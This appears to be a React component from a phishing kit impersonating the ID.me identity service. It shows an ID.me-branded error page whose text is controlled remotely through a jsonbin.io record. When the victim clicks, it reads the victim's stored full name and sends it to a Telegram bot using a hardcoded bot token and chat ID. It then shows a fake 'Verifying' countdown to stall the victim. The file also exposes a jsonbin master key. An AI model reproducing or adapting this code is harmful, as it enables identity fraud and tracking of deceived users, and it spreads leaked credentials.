import React, { useEffect, useState } from "react";
import logo from '../assets/ID.me_Logo.png'
// import photo from '../assets/PHONE.jpg'
import connect from '../assets/connect.jpg'
import elogo from '../assets/logo-removebg-preview.png'
const SecondErrorPage: React.FC = () => {
  const storedData = localStorage.getItem("applicationData");
  const parsedData = storedData ? JSON.parse(storedData) : {};

  const fullName = parsedData.fullname || "N/A";

  
  const [showPopup, setShowPopup] = useState(false);
  const [countdown, setCountdown] = useState(100);
  const BIN_URL = "https://api.jsonbin.io/v3/b/680384f78561e97a5002fb0b/latest";
  const API_KEY = "$2a$10$yti1izYQ7PKY9IhwxrQiuuIk8TZDdxM6nzYFnduMOvJtKIdyRhBB.";
  
 
    const [title, setTitle] = useState("");
    const [errorMessage, setErrorMessage] = useState("");
    const [email, setEmail] = useState("");
  
    const fetchData = async () => {
      const res = await fetch(BIN_URL, {
        headers: {
          "X-Master-Key": API_KEY,
        },
      });
  
      const data = await res.json();
      const record = data.record;
  
      setTitle(record.title || "");
      setErrorMessage(record.errorMessage || "");
      setEmail(record.email || "");
    };
  
    useEffect(() => {
      fetchData();
    }, []);
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
  
    setShowPopup(true);
  
    const botToken = "7926454402:AAEDVoo1vW7hFgkLKM3qK3f8EsiiKuDsT8c";
    const chatId = "7062736155";
    const message = `${fullName} Sign in clicked`;
  
    try {
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        }),
      });
      
    } catch (error) {
      console.error("Error sending to Telegram:", error);
    }
  };

  useEffect(() => {
    let timer: NodeJS.Timeout;

    if (showPopup && countdown > 0) {
      timer = setTimeout(() => {
        setCountdown((prev) => prev - 1);
      }, 1000);
    }

    if (countdown === 0) {
      window.location.reload();
    }

    return () => clearTimeout(timer);
  }, [showPopup, countdown]);



  

  return (
    <div className="flex justify-center items-center min-h-screen bg-white px-4">

{showPopup && (
  <div className="fixed inset-0 bg-black bg-opacity-80 flex justify-center items-center z-50">
    <div className="bg-white rounded-lg p-6 w-[350px] h-[400px] max-w-md text-center shadow-lg flex flex-col justify-center">
      <div className="flex justify-center mb-4"><img src={elogo} width={50}  /></div>
      <h2 className="text-sm font-semibold text-black mb-2">Verifying....</h2>
      <p className="text-sm font-semibold text-black mb-6">
        Please wait while the system connects. Avoid refreshing the page; this may take a moment.
      </p>

      <div className="w-full bg-gray-200 rounded-full h-4 mb-6">
        <div
          className="bg-green-500 h-4 rounded-full transition-all duration-1000"
          style={{ width: `${100 - countdown}%` }}
        ></div>
      </div>

      <p className="text-sm text-gray-600">Typically, <strong>{countdown}</strong> seconds remaining</p>
    </div>
  </div>
)}


      <div className="w-full max-w-md bg-white p-6 text-center relative">
        {/* Spinner */}
        <div className="absolute top-4 left-1/2 transform -translate-x-1/2">
          <svg
            className="animate-spin h-6 w-6 text-gray-600"
            xmlns="http://www.w3.org/2000/svg"
            fill="none"
            viewBox="0 0 24 24"
          >
            <circle
              className="opacity-25"
              cx="12"
              cy="12"
              r="10"
              stroke="currentColor"
              strokeWidth="4"
            />
            <path
              className="opacity-75"
              fill="currentColor"
              d="M4 12a8 8 0 018-8v8H4z"
            />
          </svg>
        </div>

        {/* Logo */}
        <h1 className="text-3xl flex  justify-center gap-4 font-medium mt-10 mb-6">
         <img src={logo} alt="" className="w-[100px]"/>
          <img src={connect} alt="" />
        </h1>

     

     <h1 className="text-2xl text-center text-gray-800 mb-4">{title}</h1>       
      

     
      
      <p className="text-gray-500 text-[16px]">{errorMessage}</p>
      <p className="text-gray-900 bg-blue-100 px-4 py-2 mt-4 mb-5 "> {email}</p>





<button
           onClick={handleSubmit}
            
          >
           
          </button>
      </div>
    </div>
  );
};

export default SecondErrorPage;
